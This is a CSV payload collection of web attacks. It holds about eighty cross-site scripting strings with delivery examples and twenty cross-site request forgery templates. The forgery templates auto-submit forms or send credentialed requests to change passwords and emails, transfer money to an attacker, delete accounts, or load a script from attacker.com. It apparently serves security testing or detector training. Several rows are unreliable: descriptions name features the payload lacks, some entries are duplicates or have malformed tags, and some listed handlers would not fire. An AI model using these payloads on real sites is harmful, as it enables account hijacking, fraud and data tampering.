id,attack_class,payload,type,severity,context,description,example
xss-025,xss,<form onreset=alert('XSS25')><input type='reset'></form>,reflected,high,URL parameter,Reflected XSS with form tag and onreset event,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,xss,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,stored,high,User input field,Stored XSS with marquee tag and onstart event,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,xss,"<embed src='javascript:alert(""XSS27"")'>",reflected,high,URL parameter,Reflected XSS with embed tag and src attribute,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,xss,"<bgsound src='javascript:alert(""XSS28"")'>",stored,high,User input field,Stored XSS with bgsound tag and src attribute,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,xss,<xml onload=alert('XSS29')>,reflected,high,URL parameter,Reflected XSS with xml tag and onload event,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-030,xss,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",stored,high,User input field,Stored XSS with iframe and onload event,"User input: <iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,xss,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,reflected,high,URL parameter,Reflected XSS using SVG with animate element and begin attribute,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,xss,"<base href=""javascript:alert('XSS32');//"">",stored,high,User profile input,Stored XSS using JavaScript URI in base tag,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,xss,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,reflected,high,URL parameter,Reflected XSS using malformed iframe with srcdoc and encoded script,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,xss,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",stored,high,User input field,Stored XSS using onpointerover event in div,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,xss,<script>alert(XSS35)</script>,reflected,high,URL parameter,Reflected XSS using malformed script tag with backticks,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,xss,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,stored,high,User input field,Stored XSS using SVG foreignObject with embedded HTML and script,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,xss,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",reflected,high,URL parameter,Reflected XSS using onanimationstart event in div,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,xss,"<input oninput='alert(""XSS38"")'>",stored,high,User input field,Stored XSS using input tag with oninput event,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,xss,<script>eval(alert('XSS39'))</script>,reflected,high,URL parameter,Reflected XSS using malformed script with template literals,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,xss,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",stored,high,User input field,Stored XSS using object tag with data URI,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,xss,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",reflected,high,URL parameter,Reflected XSS using onpointerdown event in span,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,xss,"<math href='javascript:alert(""XSS42"")'>X</math>",stored,high,User input field,Stored XSS using math tag with href attribute and javascript URI,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,xss,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with sandbox attribute bypass,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,xss,"<video oncanplay='alert(""XSS44"")'></video>",stored,high,User input field,Stored XSS using video tag with oncanplay event,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,xss,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",reflected,high,URL parameter,Reflected XSS using meta tag with refresh and encoded javascript URI,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,xss,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with set attribute and onbegin event,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,xss,"<script>setTimeout('alert(""XSS47"")',0)</script>",reflected,high,URL parameter,Reflected XSS using malformed script with setTimeout,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,xss,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,xss,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",reflected,high,URL parameter,Reflected XSS using input tag with formaction attribute,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,xss,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,xss,"<script>setInterval(function(){alert('XSS51')},1000)</script>",reflected,high,URL parameter,Reflected XSS using script tag with setInterval,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,xss,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and srcdoc,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,xss,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",reflected,high,URL parameter,Reflected XSS using svg with onload and script tag,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,xss,"<iframe src='javascript:alert(""XSS54"")'></iframe>",stored,high,User input field,Stored XSS using iframe with src set to javascript URI,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,xss,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",reflected,high,URL parameter,Reflected XSS using object tag with type attribute and data URI,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,xss,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",stored,high,User input field,Stored XSS using svg with onload and setTimeout,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,xss,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and encoded script,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,xss,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with animateTransform and onbegin event,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,xss,"<script>Function('alert(""XSS59"")')()</script>",reflected,high,URL parameter,Reflected XSS using script tag with Function constructor,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-060,xss,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and encoded srcdoc,"User input: <iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,xss,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,reflected,high,URL parameter,Reflected XSS using SVG with feImage and onload event,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,xss,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event and script,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,xss,"<math href='javascript:alert(""XSS63"")'>X</math>",reflected,high,URL parameter,Reflected XSS using math tag with href attribute and javascript URI,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,xss,"<audio src='x' onerror='alert(""XSS64"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onerror event,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,xss,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and onload event,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,xss,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,xss,"<input oninvalid='alert(""XSS67"")' required>",reflected,high,URL parameter,Reflected XSS using input tag with oninvalid event,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,xss,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",stored,high,User input field,Stored XSS using iframe with allow attribute and srcdoc,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,xss,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onfocusin event,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,xss,"<video onpause='alert(""XSS70"")'></video>",stored,high,User input field,Stored XSS using video tag with onpause event,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,xss,"<svg onmouseenter='alert(""XSS71"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onmouseenter event,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,xss,"<form oninput='alert(""XSS72"")'><input></form>",stored,high,User input field,Stored XSS using form tag with oninput event,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,xss,"<svg onwheel='alert(""XSS73"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,xss,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",stored,high,User input field,Stored XSS using iframe with allowfullscreen attribute and onload event,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,xss,"<svg onanimationend='alert(""XSS75"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onanimationend event,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,xss,"<audio onplay='alert(""XSS76"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onplay event,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,xss,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onscroll event,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,xss,"<iframe seamless onload='alert(""XSS78"")'></iframe>",stored,high,User input field,Stored XSS using iframe with seamless attribute and onload event,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,xss,"<svg oncut='alert(""XSS79"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with oncut event,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,xss,"<svg oncopy='alert(""XSS80"")'></svg>",stored,high,User input field,Stored XSS using svg with oncopy event,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,xss,"<svg onpaste='alert(""XSS81"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpaste event,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,xss,"<svg onreset='alert(""XSS82"")'></svg>",stored,high,User input field,Stored XSS using svg with onreset event,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,xss,"<svg onsearch='alert(""XSS83"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsearch event,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,xss,"<svg onselect='alert(""XSS84"")'></svg>",stored,high,User input field,Stored XSS using svg with onselect event,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,xss,"<svg onshow='alert(""XSS85"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,xss,"<svg ontoggle='alert(""XSS86"")'></svg>",stored,high,User input field,Stored XSS using svg with ontoggle event,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,xss,"<svg ontransitionend='alert(""XSS87"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with ontransitionend event,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,xss,"<svg onunload='alert(""XSS88"")'></svg>",stored,high,User input field,Stored XSS using svg with onunload event,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,xss,"<svg onvolumechange='alert(""XSS89"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onvolumechange event,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,xss,"<svg onwaiting='alert(""XSS90"")'></svg>",stored,high,User input field,Stored XSS using svg with onwaiting event,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,xss,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event and CSS animation,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,xss,"<svg onpointercancel='alert(""XSS92"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointercancel event,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,xss,"<svg onpointerout='alert(""XSS93"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerout event,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,xss,"<svg onpointerover='alert(""XSS94"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointerover event,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,xss,"<svg onpointerup='alert(""XSS95"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerup event,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,xss,"<svg onselectstart='alert(""XSS96"")'></svg>",stored,high,User input field,Stored XSS using svg with onselectstart event,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,xss,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event and tabindex,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,xss,"<svg onstalled='alert(""XSS98"")'></svg>",stored,high,User input field,Stored XSS using svg with onstalled event,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,xss,"<svg onsubmit='alert(""XSS99"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsubmit event,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
xss-100,xss,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>",stored,high,User input field,Stored XSS using svg with onunload event and script,"User input: <svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
csrf-001,csrf,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,high,Malicious webpage,CSRF using auto-submitting hidden form with POST method,Embed this form in a malicious page to auto-submit password change.
csrf-002,csrf,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,CSRF,medium,Malicious webpage,CSRF using image tag with GET request,Trigger account deletion via GET request.
csrf-003,csrf,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",CSRF,high,Malicious webpage,CSRF using XMLHttpRequest with credentials,Perform unauthorized money transfer.
csrf-004,csrf,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",CSRF,high,Malicious webpage,CSRF using fetch API with credentials,Change victim's email address.
csrf-005,csrf,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,medium,Malicious webpage,CSRF using auto-submitting form with file upload,Upload malicious avatar file.
csrf-006,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh redirect with GET request,Subscribe victim to premium plan.
csrf-007,csrf,<script src='https://attacker.com/csrf-trigger.js'></script>,CSRF,high,Malicious webpage,CSRF using script tag to load external script triggering action,Load external script that performs CSRF.
csrf-008,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with auto-submitting form inside,Change user settings silently.
csrf-009,csrf,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,CSRF,high,Malicious webpage,CSRF using SVG with embedded script and form submission,Trigger delete API call.
csrf-010,csrf,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API to send POST request,Send data to target endpoint.
csrf-011,csrf,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify data,Modify data before submission.
csrf-012,csrf,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,Like a post on victim's behalf.
csrf-013,csrf,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with hidden inputs and auto-submit,Transfer money silently.
csrf-014,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with POST and custom headers,Attempt to bypass CSRF token.
csrf-015,csrf,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data,Upload file without user consent.
csrf-016,csrf,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to delay request,Delayed delete request.
csrf-017,csrf,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe to hide submission,Change settings silently.
csrf-018,csrf,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with GET method and auto-submit,Send friend request without user consent.
csrf-019,csrf,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using meta refresh with POST form submission via JavaScript,Subscribe victim to premium plan.
csrf-020,csrf,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>",CSRF,medium,Malicious webpage,CSRF using script with navigator.sendBeacon to send data,Send tracking data or trigger action.
